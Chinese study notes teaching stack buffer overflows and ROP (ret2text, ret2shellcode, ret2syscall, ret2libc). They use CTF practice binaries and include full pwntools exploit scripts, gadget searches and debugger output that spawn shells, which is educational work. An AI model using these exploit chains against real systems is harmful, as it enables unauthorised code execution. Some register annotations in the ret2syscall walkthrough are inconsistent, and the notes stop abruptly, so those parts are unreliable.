```c
学习笔记4
```

**栈介绍**

栈是一种典型的先进后出(First in Last Out)的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作，如下图所示（维基百科）。两种操作都是操作栈顶，当然，它也有相应的栈底。

在计算机的汇编程序运行过程中，也充分利用了这一数据结构。每个程序都有自己的进程地址空间，进程地址空间中的某一部分就是该程序对应的栈，用于**保存函数调用信息和局部变量**。此外，常见的操作也同样是压栈与出栈。需要注意的是，与一般我们理解不同的是，**程序的栈是从进程地址空间的高地址向低地址增长的**。

**函数调用栈**

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210629135714461.png" alt="image-20210629135714461" style="zoom:67%;" />

需要注意的是，32位程序与64位程序有以下简单的区别

- **x86**

- **函数参数**在**函数返回地址**的上方
- **x64**
- x64中前六个参数依次保存在**RDI,RSI, RDX, RCX, R8和 R9寄存器**里，如果还有更多的参数的话才会保存在栈上。
- 内存地址不能大于0x00007FFFFFFFFFFF，**6个字节长度**，否则会抛出异常。

**栈溢出原理**

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：

- 程序必须向栈上写入数据。
- 写入的数据大小没有被良好地控制。

最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址的代码可以执行**。下面，我们举一个简单的例子：

```c
##include <stdio.h>
##include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行success函数。**

1.首先，我们利用如下命令对齐进行编译

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
```

可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，

历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。

此外，-m32 指的是生成32位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。

2.然后，我们在win操作机上利用IDA来反编译一下二进制程序并查看vulnerable函数（点击g输入vulnerable回车可以直接转到该函数），可以看到

```c
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1
gets(&s);
  return puts(&s);
}
```

3.可以看到，该字符串距离ebp的长度为0x14，那么相应的栈结构为

```c
     									   +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

并且，我们可以通过readelf获得success的地址，其地址为0x0804843B。

```shell
readelf -a stack_example |grep success
54: 0804843b    25 FUNC    GLOBAL DEFAULT   14 success
```

4.那么，如果我们读取的字符串为

0x14*'a'+'bbbb'+success_addr

由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为

```c
										   +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+	
```

需要注意的是，由于在计算机内存中，对应的每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B的存储是如下结构

\x3b\x84\x04\x08

6.但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\，x等也算一个单独的字符。。所以我们需要想办法将\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x0804843b
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
#7.执行一波代码，可以得到
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```

可以看到我们确实已经执行success函数。

**总结**

**寻找危险函数**

通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。

常见的危险函数如下

- 输入

- - gets，直接读取一行，忽略'\x00'
  - scanf
  - vscanf

- 输出

- - sprintf

- 字符串

- - strcpy，字符串复制，遇到'\x00'停止
  - strcat，字符串拼接，遇到'\x00'停止
  - bcopy

**确定填充长度**

这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引
- 相对应栈顶指针的索引
- 直接地址索引

其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求

- **覆盖函数返回地址**，这时候就是直接看EBP即可。
- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
- **覆盖bss段某个变量的内容**。
- 等等

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。

## ROP大章

**基本ROP**-**ret2text**

随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。**所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件

- 程序存在溢出，并且可以控制返回地址。
- 可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。

ret2text即需要我们控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的rop。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。	

**bamboofox中介绍ROP时使用的ret2text的例子：**

1.首先，查看一下程序的保护机制

```c
➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序是32位程序，其仅仅开启了栈不可执行保护。

2.然后，我们在win操作机中使用IDA来查看源代码。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞。

3.此后又发现，在secure函数又发现了存在调用system("/bin/sh")的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到系统的shell了。

```assembly
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```

4.下面就是我们如何构造payload了，首先需要确定的是我们能够控制的内存地址距离main函数的返回地址的字节数。

```assembly
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
```

5.可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp，如下

```assembly
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?
Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      gets(buf);
───────────────────────────────────────────────────────
────────────────[registers ]───────────────────────────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
```

6.可以看到esp为0xffffcd40，ebp为具体的payload如下0xffffcdc8，同时s相对于esp的索引为[esp+0x1c]，所以，s的地址为0xffffcd5c，所以s相对于ebp的偏移为0x6C，所以相对于返回地址的偏移为0x6c+4。

最后的payload如下：

```python
##!/usr/bin/env python
from pwn import *
sh = process('./ret2text')
target = 0x804863a
sh.sendline('A' * (0x6c+4) + p32(target))
sh.interactive()
```

**基本ROP**-**ret2shellcode**

ret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。**一般来说，shellcode都需要我们自己去填充。这其实是另外一种典型的利用的方法，即此时我们需要自己去填充一些可执行的代码**。

而在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行shellcode，需要对应的binary文件没有开启NX保护。

**以bamboofox中的ret2shellcode为例**

```c
➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

2.我们再win操作机中使用IDA看一下程序。可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

3.ida中双击buf2，可知buf2在bss段。

```assembly
.bss:0804A080   public buf2
.bss:0804A080 ; char buf2[100]
```

4.这时，我们简单的调试下程序，看看这一个bss段是否可执行。

```assembly
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
Breakpoint 1, main () at ret2shellcode.c:8
8       setvbuf(stdout, 0LL, 2, 0LL);
────────────[ source:ret2shellcode.c+8 ]────────────
      6  int main(void)
      7  {
 →    8      setvbuf(stdout, 0LL, 2, 0LL);
      9      setvbuf(stdin, 0LL, 1, 0LL);
     10  
────────────────────────────────────[ trace ]────────────────────────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx
0xf7fd3000 0xf7fd5000 0x00000000 rwx
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

5.通过vmmap，我们可以看到bss段对应的段具有可执行权限

```assembly
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
```

6.那么这次我们就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bss段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。

具体的payload如下

```python
##!/usr/bin/env python
from pwn import *
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

**基本ROP**-**ret2syscall**

ret2syscall需要我们控制程序执行系统调用，获取shell。

这里我们以bamboofox中的ret2syscall为例

1.首先检测程序开启的保护。

```assembly
➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

2.可以看出，源程序为32位，开启了NX保护。接下来利用IDA来查看源码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

3.可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。

4.简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell

```c
execve("/bin/sh",NULL,NULL)
```

其中，该程序是32位，所以我们需要使得

- 系统调用号即eax应该为0xb
- 第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以
- 第二个参数即ecx应该为0
- 第三个参数edx应该为0

而我们如何控制这些寄存器的值 呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。

5.首先，我们来寻找控制eax的gadgets

```assembly
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es  ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

6.可以看到有上述几个都可以控制eax，那我就选取第二个来作为我的gadgets。

类似的，我们可以得到控制其它寄存器的gadgets

```assembly
ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

这里，我选择

```assembly
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

这个可以直接控制其它三个寄存器。

7.此外，我们需要获得/bin/sh字符串对应的地址。

```assembly
➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh'
Strings information
============================================================
0x080be408 : /bin/sh
```

8.可以找到对应的地址，此外，还有int 0x80的地址，如下

```assembly
➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc
Unique gadgets found: 4
```

同时，也找到对应的地址了。

9.下面就是对应的payload,其中0xb为execve对应的系统调用号。

```python
##!/usr/bin/env python
from pwn import *
sh = process('./rop')
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

**栈布局**

payload栈中部署：

```assembly
                       +---------------------------+
                       |         int_0x80          | int_0x80指令部署(等待被执行)
                       +---------------------------+
                       |          bin_sh           | execve第一个参数部署(等待pop到edx中)
                       +---------------------------+
                       |            0              | execve第二个参数部署(等待pop到ecx中)
                       +---------------------------+
                       |            0              | execve第三个参数部署(等待pop到ebx中)
                       +---------------------------+
                       |pop_edx_pop_ecx_pop_ebx_ret| 执行pop ebx、ecx、edx ret地址
                       +---------------------------+
                       |           0xb             | 系统调用号部署（等待pop到eax寄存器中） 
                       +---------------------------+
                       |       pop_eax_ret         | 执行pop eax ret地址，覆盖原ret返回位置
                       +---------------------------+
                       |           kdig            | 'hollkdig'覆盖原saved ebp位置
                ebp--->+---------------------------+
                       |           holl            | 'hollkdig'占位填满栈空间
                       |           ....            | 'hollkdig'占位填满栈空间
                       |           kdig            | 'hollkdig'占位填满栈空间
                       |           holl            | 'hollkdig'占位填满栈空间
                       |           kdig            | 'hollkdig'占位填满栈空间
                       |           holl            | 'hollkdig'占位填满栈空间
  v4终止位置,ebp-0x64-->+---------------------------+
```

执行流程：

```assembly
eip ---> pop_eax_ret gadget地址				   (由于pop_eax_ret覆盖了原ret地址，所以eip指向gadget并执行)
esp ---> 0xb								    (此时esp指向部署到栈中的0xb)
eax = 0xb										(pop eax后将0xb压入eax寄存器)
eip ---> pop_edx_pop_ecx_pop_ebx_ret gadget地址  
										     (由于pop eax结束后进行ret操作，所以eip继续指向第二个gadget并执行)
esp ---> 0									 (此时esp指向部署到栈中的execve第三个参数0)
ebx = 0										 (pop ebx后将0压入ebx寄存器)
esp ---> 0									 (此时esp指向部署到栈中的execve第三个参数0)
ecx = 0										 (pop ecx后将0压入ecx寄存器)
esp ---> bin_sh地址			 		        (此时esp指向部署到栈中的execve第三个参数bin_sh地址)
edx = bin_sh地址					            (pop edx后将bin_sh地址压入eax寄)
执行int_0x80                                  (由于执行完pop ebx、ecx、edx后进行ret操作，所以eip指向最后的int)
```

**基本ROP**-**ret2libc**

ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system("/bin/sh")，故而此时我们需要知道system函数的地址。

**以bamboofox中ret2libc1**

1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。

```c
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

3.此外，利用ropgadget，我们可以查看是否有/bin/sh存在

```c
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh
```

确实存在，再次查找一下是否有system函数存在。经在ida中查找，确实也存在。

```assembly
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
```

4.那么，我们直接返回该处，即执行system函数。相应的payload如下

```python
##!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1')
binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)
sh.interactive()
```

这里我们需要注意函数调用栈的结构，如果是正常调用system函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb'作为虚假的地址，其后参数对应的参数内容。

这个例子，相对来说，最为简单，同时提供了system地址与/bin/sh的地址，但是大多数程序并不会有这么好的情况。

**以bamboofox中的ret2libc2为例**

1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。

```assembly
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

3.该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system("/bin/sh")。

4.首先需要在bss段找一块地址写我们的/bin/sh的字符串，我们可以发现bss段有个buf2的变量，未被使用

```assembly
.bss:0804A080 buf2            db 64h dup(?)
.bss:0804A080 _bss            ends
```

那么构造如下： 

```c
gets(buf2);
system(buf2);
```

那么先让返回地址为gets函数地址，参数为buf2地址，下一层返回地址需要弹出栈顶的buf2，然后跳到system地址去执行，那么就需要找一个pop|ret的gadget

```assembly
ROPgadget --binary ret2libc2 --only "pop|ret"
Gadgets information
============================================================
0x0804872f : pop ebp ; ret
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
0x0804872e : pop edi ; pop ebp ; ret
0x0804872d : pop esi ; pop edi ; pop ebp ; ret
0x08048426 : ret
0x0804857e : ret 0xeac1
Unique gadgets found: 7
```

这里我们选择0x0804843d这个地址

5.利用脚本如下所示：

```python
##!/usr/bin/env python
from pwn import *
sh = process('./ret2libc2')
gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

需要注意的是，我这里向程序中bss段的buf2处写入/bin/sh字符串，并将其地址作为system的参数传入。这样以便于可以获得shell。

**以bamboofox中的ret2libc3为例**

在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。

1.首先，查看安全保护。可以看出，源程序仍旧开启了堆栈不可执行保护。

➜ ret2libc3 checksec ret2libc3
   Arch:   i386-32-little
   RELRO:  Partial RELRO
   Stack:  No canary found
   NX:    NX enabled
   PIE:   No PIE (0x8048000)

2.进而查看源码，发现程序的bug仍然是栈溢出。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
 {
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
 }
```

3.那么我们如何得到system函数的地址呢？这里就主要利用了两个知识点

- system函数属于libc，而libc.so文件中的函数之间相对偏移是固定的。
- 即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而libc在github上有人进行收集（libc-database），具体细节如下

所以如果我们知道libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system函数的地址。

那么如何得到libc中的某个函数的地址呢？我们一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。**当然，由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露。**

我们自然可以根据上面的步骤先得到libc，之后在程序中查询偏移，然后再次获取system地址，但这样手工操作次数太多，有点麻烦，github上有一个libc的利用工具（LibcSearcher），具体细节请参考readme

此外，在得到libc之后，其实libc中也是有/bin/sh字符串的，所以我们可以一起获得/bin/sh字符串的地址。

4.这里我们泄露__libc_start_main的地址，这是因为它是程序最初被执行的地方。基本利用思路如下

- 泄露__libc_start_main地址
- 获取libc版本(这里借助的是LibcSearcher)
- 获取system地址与/bin/sh的地址
- 再次执行源程序
- 触发栈溢出执行system(‘/bin/sh’)

exp如下???

```python
##!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')
ret2libc3 = ELF('./ret2libc3')
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)
print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)
sh.interactive()
```

**shell获取小结**

这里总结几种常见的获取shell的方式：

- 执行shellcode，这一方面也会有不同的情况

- - 可以直接返回shell
  - 可以将shell返回到某一个端口
  - shellcode中字符有时候需要满足不同的需求
  - **注意，我们需要将shellcode写在可以执行的内存区域中。**

- 执行     system("/bin/sh"), system('sh') 等等

- - 关于 system的地址，参见下面章节的**地址寻找**。

  - 关于 "/bin/sh",“sh”

  - - 首先寻找 binary 里面有没有对应的字符串，**比如说有 flush 函数，那就一定有 sh 了**
    - 考虑个人读取对应字符串
    - libc 中其实是有 /bin/sh 的

  - 优点

  - - 只需要一个参数。

  - 缺点

  - - **有可能因为破坏环境变量而无法执行。**

- 执行     execve("/bin/sh",NULL,NULL)

- - 前几条同 system

  - 优点

  - - 几乎不受环境变量的影响。

  - 缺点

  - - **需要 3 个参数。**

- 系统调用

- - 系统调用号 11(0xb)

**地址寻找小结**

在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种

**通用寻找**

**直接地址寻找**

程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。

**got表寻找**

